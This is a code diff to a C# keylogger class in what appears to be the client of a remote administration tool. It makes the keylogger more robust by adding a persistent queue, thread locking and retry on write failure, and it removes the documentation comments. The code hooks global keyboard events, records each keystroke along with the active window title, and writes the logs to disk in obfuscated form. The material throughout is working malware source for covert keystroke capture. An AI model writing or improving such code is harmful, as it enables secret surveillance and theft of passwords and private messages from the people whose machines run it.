@@ -15,81 +15,69 @@ using Timer = System.Timers.Timer;
 namespace Pulsar.Client.Logging
 {
     /// <summary>
-    /// This class provides keylogging functionality and modifies/highlights the output for
-    /// better user experience.
+    /// This class provides keylogging functionality with persistent queue support.
     /// </summary>
     public class Keylogger : IDisposable
     {
-        /// <summary>
-        /// <c>True</c> if the class has already been disposed, else <c>false</c>.
-        /// </summary>
         public bool IsDisposed { get; private set; }
 
-        /// <summary>
-        /// The timer used to periodically flush the <see cref="_logFileBuffer"/> from memory to disk.
-        /// </summary>
         private readonly Timer _timerFlush;
-
-        /// <summary>
-        /// The buffer used to store the logged keys in memory.
-        /// </summary>
+        private readonly Timer _timerProcessQueue;
         private readonly StringBuilder _logFileBuffer = new StringBuilder();
-
-        /// <summary>
-        /// Temporary list of pressed keys while they are being processed.
-        /// </summary>
         private readonly List<Keys> _pressedKeys = new List<Keys>();
-
-        /// <summary>
-        /// Temporary list of pressed keys chars while they are being processed.
-        /// </summary>
         private readonly List<char> _pressedKeyChars = new List<char>();
-
-        /// <summary>
-        /// Saves the last window title of an application.
-        /// </summary>
+        private readonly PersistentQueue<LogEntry> _persistentQueue;
         private string _lastWindowTitle = string.Empty;
-
-        /// <summary>
-        /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
-        /// </summary>
         private bool _ignoreSpecialKeys;
-
-        /// <summary>
-        /// Used to hook global mouse and keyboard events.
-        /// </summary>
         private readonly IKeyboardMouseEvents _mEvents;
-
-        /// <summary>
-        /// The maximum size of a single log file.
-        /// </summary>
         private readonly long _maxLogFileSize;
+        private readonly object _bufferLock = new object();
 
         /// <summary>
-        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
+        /// Represents a log entry to be persisted.
         /// </summary>
-        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
-        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
+        private class LogEntry
+        {
+            public string Content { get; set; }
+            public DateTime Timestamp { get; set; }
+        }
+
         public Keylogger(double flushInterval, long maxLogFileSize)
         {
             _maxLogFileSize = maxLogFileSize;
             _mEvents = Hook.GlobalEvents();
+
+            string queuePath = Path.Combine(Settings.LOGSPATH, "queue");
+            _persistentQueue = new PersistentQueue<LogEntry>(
+                queuePath,
+                entry => $"{entry.Timestamp:o}|{entry.Content}",
+                str =>
+                {
+                    var parts = str.Split(new[] { '|' }, 2);
+                    return new LogEntry
+                    {
+                        Timestamp = DateTime.Parse(parts[0], null, DateTimeStyles.RoundtripKind),
+                        Content = parts.Length > 1 ? parts[1] : string.Empty
+                    };
+                }
+            );
+
             _timerFlush = new Timer { Interval = flushInterval };
-            _timerFlush.Elapsed += TimerElapsed;
+            _timerFlush.Elapsed += TimerFlushElapsed;
+
+            _timerProcessQueue = new Timer { Interval = 5000 };
+            _timerProcessQueue.Elapsed += TimerProcessQueueElapsed;
+
+            ProcessPersistentQueue();
         }
 
-        /// <summary>
-        /// Begins logging of keys.
-        /// </summary>
         public void Start()
         {
             Subscribe();
             _timerFlush.Start();
+            _timerProcessQueue.Start();
         }
 
-        /// <summary>
-        /// Disposes used resources by this class.
-        /// </summary>
         public void Dispose()
         {
             Dispose(true);
@@ -106,16 +94,20 @@ namespace Pulsar.Client.Logging
                 Unsubscribe();
                 _timerFlush.Stop();
                 _timerFlush.Dispose();
+                _timerProcessQueue.Stop();
+                _timerProcessQueue.Dispose();
                 _mEvents.Dispose();
-                WriteFile();
+
+                FlushToQueue();
+
+                ProcessPersistentQueue();
+
+                _persistentQueue.Dispose();
             }
 
             IsDisposed = true;
         }
 
-        /// <summary>
-        /// Subscribes to all key events.
-        /// </summary>
         private void Subscribe()
         {
             _mEvents.KeyDown += OnKeyDown;
@@ -123,9 +115,6 @@ namespace Pulsar.Client.Logging
             _mEvents.KeyPress += OnKeyPress;
         }
 
-        /// <summary>
-        /// Unsubscribes from all key events.
-        /// </summary>
         private void Unsubscribe()
         {
             _mEvents.KeyDown -= OnKeyDown;
@@ -133,22 +122,19 @@ namespace Pulsar.Client.Logging
             _mEvents.KeyPress -= OnKeyPress;
         }
 
-        /// <summary>
-        /// Initial handling of the key down events and updates the window title.
-        /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key event args, e.g. the keycode.</param>
-        /// <remarks>This event handler is called first.</remarks>
         private void OnKeyDown(object sender, KeyEventArgs e)
         {
             string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
             if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
             {
-                _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.AppendLine();
-                _logFileBuffer.AppendLine();
-                _logFileBuffer.AppendLine($"[{activeWindowTitle} - {DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)} UTC]");
-                _logFileBuffer.AppendLine();
+                lock (_bufferLock)
+                {
+                    _lastWindowTitle = activeWindowTitle;
+                    _logFileBuffer.AppendLine();
+                    _logFileBuffer.AppendLine();
+                    _logFileBuffer.AppendLine($"[{activeWindowTitle} - {DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)} UTC]");
+                    _logFileBuffer.AppendLine();
+                }
             }
 
             if (_pressedKeys.ContainsModifierKeys())
@@ -163,8 +149,6 @@ namespace Pulsar.Client.Logging
 
             if (!e.KeyCode.IsExcludedKey())
             {
-                // The key was not part of the keys that we wish to filter, so
-                // be sure to prevent a situation where multiple keys are pressed.
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
                     Debug.WriteLine("OnKeyDown: " + e.KeyCode);
@@ -173,12 +157,6 @@ namespace Pulsar.Client.Logging
             }
         }
 
-        /// <summary>
-        /// Processes pressed keys and appends them to the <see cref="_logFileBuffer"/>. Processing of Unicode characters starts here.
-        /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key press event args, especially the pressed KeyChar.</param>
-        /// <remarks>This event handler is called second.</remarks>
         private void OnKeyPress(object sender, KeyPressEventArgs e)
         {
             if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
@@ -194,39 +172,29 @@ namespace Pulsar.Client.Logging
                         _ignoreSpecialKeys = true;
 
                     _pressedKeyChars.Add(e.KeyChar);
-                    _logFileBuffer.Append(keyChar);
+
+                    lock (_bufferLock)
+                    {
+                        _logFileBuffer.Append(keyChar);
+                    }
                 }
             }
         }
 
-        /// <summary>
-        /// Finishes processing of the keys.
-        /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key event args.</param>
-        /// <remarks>This event handler is called third.</remarks>
         private void OnKeyUp(object sender, KeyEventArgs e)
         {
-            _logFileBuffer.Append(FormatSpecialKeys(_pressedKeys.ToArray()));
+            lock (_bufferLock)
+            {
+                _logFileBuffer.Append(FormatSpecialKeys(_pressedKeys.ToArray()));
+            }
             _pressedKeyChars.Clear();
         }
 
-        /// <summary>
-        /// Finds a held down key char in a given key char list.
-        /// </summary>
-        /// <param name="list">The list of key chars.</param>
-        /// <param name="search">The key char to search for.</param>
-        /// <returns><c>True</c> if the list contains the key char, else <c>false</c>.</returns>
         private bool DetectKeyHolding(List<char> list, char search)
         {
             return list.FindAll(s => s.Equals(search)).Count > 1;
         }
 
-        /// <summary>
-        /// Formats special keys as raw text without HTML formatting.
-        /// </summary>
-        /// <param name="keys">The input keys.</param>
-        /// <returns>The formatted special keys as raw text.</returns>
         private string FormatSpecialKeys(Keys[] keys)
         {
             if (keys.Length < 1) return string.Empty;
@@ -251,16 +219,16 @@ namespace Pulsar.Client.Logging
             if (_pressedKeys.ContainsModifierKeys())
             {
                 StringBuilder specialKeys = new StringBuilder();
-
                 int validSpecialKeys = 0;
+
                 for (int i = 0; i < names.Length; i++)
                 {
                     _pressedKeys.Remove(keys[i]);
-                    if (string.IsNullOrEmpty(names[i])) continue; specialKeys.Append((validSpecialKeys == 0) ? $"[{names[i]}" : $" + {names[i]}");
+                    if (string.IsNullOrEmpty(names[i])) continue;
+                    specialKeys.Append((validSpecialKeys == 0) ? $"[{names[i]}" : $" + {names[i]}");
                     validSpecialKeys++;
                 }
 
-                // If there are items in the special keys string builder, give it an ending bracket
                 if (validSpecialKeys > 0)
                     specialKeys.Append("]");
 
@@ -273,17 +241,17 @@ namespace Pulsar.Client.Logging
             for (int i = 0; i < names.Length; i++)
             {
                 _pressedKeys.Remove(keys[i]);
-                if (string.IsNullOrEmpty(names[i])) continue; switch (names[i])
+                if (string.IsNullOrEmpty(names[i])) continue;
+
+                switch (names[i])
                 {
                     case "Return":
                         normalKeys.AppendLine();
                         normalKeys.Append("[Enter]");
                         break;
-
                     case "Escape":
                         normalKeys.Append("[Esc]");
                         break;
-
                     default:
                         normalKeys.Append($"[{names[i]}]");
                         break;
@@ -294,21 +262,74 @@ namespace Pulsar.Client.Logging
             return normalKeys.ToString();
         }
 
-        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
+        /// <summary>
+        /// Flushes memory buffer to persistent queue.
+        /// </summary>
+        private void TimerFlushElapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0)
-                WriteFile();
+            FlushToQueue();
         }
 
         /// <summary>
-        /// Writes the logged keys from memory to disk.
+        /// Processes items from persistent queue to disk.
         /// </summary>
-        private void WriteFile()
+        private void TimerProcessQueueElapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            // TODO: Add some house-keeping and delete old log entries
-            bool writeHeader = false;
+            ProcessPersistentQueue();
+        }
 
-            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
+        /// <summary>
+        /// Flushes the memory buffer to the persistent queue.
+        /// </summary>
+        private void FlushToQueue()
+        {
+            lock (_bufferLock)
+            {
+                if (_logFileBuffer.Length > 0)
+                {
+                    var entry = new LogEntry
+                    {
+                        Content = _logFileBuffer.ToString(),
+                        Timestamp = DateTime.UtcNow
+                    };
+
+                    _persistentQueue.Enqueue(entry);
+                    _logFileBuffer.Clear();
+
+                    Debug.WriteLine($"Flushed to queue. Queue size: {_persistentQueue.Count}");
+                }
+            }
+        }
+
+        /// <summary>
+        /// Processes all items in the persistent queue and writes them to disk.
+        /// </summary>
+        private void ProcessPersistentQueue()
+        {
+            int processedCount = 0;
+
+            while (_persistentQueue.TryDequeue(out LogEntry entry))
+            {
+                WriteEntryToFile(entry);
+                processedCount++;
+
+                if (processedCount >= 100)
+                    break;
+            }
+
+            if (processedCount > 0)
+            {
+                Debug.WriteLine($"Processed {processedCount} queue items. Remaining: {_persistentQueue.Count}");
+            }
+        }
+
+        /// <summary>
+        /// Writes a log entry to disk.
+        /// </summary>
+        private void WriteEntryToFile(LogEntry entry)
+        {
+            bool writeHeader = false;
+            string filePath = Path.Combine(Settings.LOGSPATH, entry.Timestamp.ToString("yyyy-MM-dd"));
 
             try
             {
@@ -323,15 +344,10 @@ namespace Pulsar.Client.Logging
                 int i = 1;
                 while (File.Exists(filePath))
                 {
-                    // Large log files take a very long time to read, decrypt and append new logs to,
-                    // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
                     long length = new FileInfo(filePath).Length;
                     if (length < _maxLogFileSize)
-                    {
                         break;
-                    }
 
-                    // append a number to the file name
                     var newFileName = $"{Path.GetFileName(filePath)}_{i}";
                     filePath = Path.Combine(Settings.LOGSPATH, newFileName);
                     i++;
@@ -340,27 +356,26 @@ namespace Pulsar.Client.Logging
                 if (!File.Exists(filePath))
                     writeHeader = true;
 
-                StringBuilder logFile = new StringBuilder(); if (writeHeader)
+                StringBuilder logFile = new StringBuilder();
+
+                if (writeHeader)
                 {
-                    logFile.AppendLine($"Log created on {DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo)} UTC");
+                    logFile.AppendLine($"Log created on {entry.Timestamp.ToString("f", DateTimeFormatInfo.InvariantInfo)} UTC");
                     logFile.AppendLine();
-                    _lastWindowTitle = string.Empty;
                 }
 
-                if (_logFileBuffer.Length > 0)
-                {
-                    logFile.Append(_logFileBuffer);
-                }
+                logFile.Append(entry.Content);
 
                 FileHelper.WriteObfuscatedLogFile(filePath, logFile.ToString());
 
                 logFile.Clear();
             }
-            catch
+            catch (Exception ex)
             {
-            }
+                Debug.WriteLine($"Failed to write log file: {ex.Message}");
 
-            _logFileBuffer.Clear();
+                _persistentQueue.Enqueue(entry);
+            }
         }
     }
 }
